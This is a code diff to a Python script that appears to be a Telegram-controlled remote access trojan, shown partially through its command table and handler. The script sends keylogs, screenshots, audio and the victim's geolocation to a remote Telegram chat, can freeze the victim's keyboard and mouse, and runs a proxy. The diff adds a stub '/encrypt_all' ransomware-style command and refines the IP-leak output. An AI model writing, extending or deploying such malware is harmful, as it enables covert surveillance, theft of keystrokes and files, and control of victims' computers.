@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 from PIL import ImageGrab 							# /capture_pc
 from shutil import copyfile, copyfileobj, rmtree 	# /ls, /pwd, /cd /copy
 from sys import argv, path, stdout 					# console output
@@ -55,6 +56,7 @@ functionalities = { '/arp' : '', \
 					'/cd':'<target_dir>', \
 					'/delete':'<target_file>', \
 					'/download':'<target_file>', \
+					'/encrypt_all':'', \
 					'/freeze_keyboard':'', \
 					'/freeze_mouse':'', \
 					'/hear':'[time in seconds, default=5s]', \
@@ -104,7 +106,7 @@ def split_string(n, st):
 	lst = ['']
 	for i in str(st):
 		l = len(lst) - 1
-		if len(lst[l]) < n: 
+		if len(lst[l]) < n:
 			lst[l] += i
 		else:
 			lst += [i]
@@ -114,7 +116,7 @@ def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
 		if 'text' in msg:
-			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
+			print '\t\tGot message from ' + str(chat_id) + ': ' + msg['text']
 			command = msg['text']
 			response = ''
 			if command == '/arp':
@@ -170,6 +172,8 @@ def handle(msg):
 							response = 'Found in hide_folder: ' + hide_folder
 						except:
 							response = 'Could not find ' + path_file
+			elif command == '/encrypt_all': #WIP
+				response = 'Not implemented yet'
 			elif command.endswith('freeze_keyboard'):
 				global keyboardFrozen
 				keyboardFrozen = not command.startswith('/un')
@@ -226,9 +230,14 @@ def handle(msg):
 			elif command == '/ip_info':
 				bot.sendChatAction(chat_id, 'find_location')
 				info = requests.get('http://ipinfo.io').text #json format
-				response = 'External IP: ' + info.replace('{', '').replace('}', '').replace(' "', '').replace('"','') + '\n' + 'Internal IP: ' + '\n' + internalIP()
 				location = (loads(info)['loc']).split(',')
 				bot.sendLocation(chat_id, location[0], location[1])
+				import string
+				import re
+				response = 'External IP: ' 
+				response += "".join(filter(lambda char: char in string.printable, info))
+				response = re.sub('[:,{}\t\"]', '', response)
+				response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
 			elif command == '/keylogs':
 				bot.sendChatAction(chat_id, 'upload_document')
 				bot.sendDocument(chat_id, open(log_file, "rb"))
@@ -272,7 +281,7 @@ def handle(msg):
 						response = 'Failed playing YouTube video'
 				else:
 					response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
-			elif command == '/proxy':#WIP
+			elif command == '/proxy':
 				threading.Thread(target=proxy.main).start()
 				info = requests.get('http://ipinfo.io').text #json format
 				ip = (loads(info)['ip'])
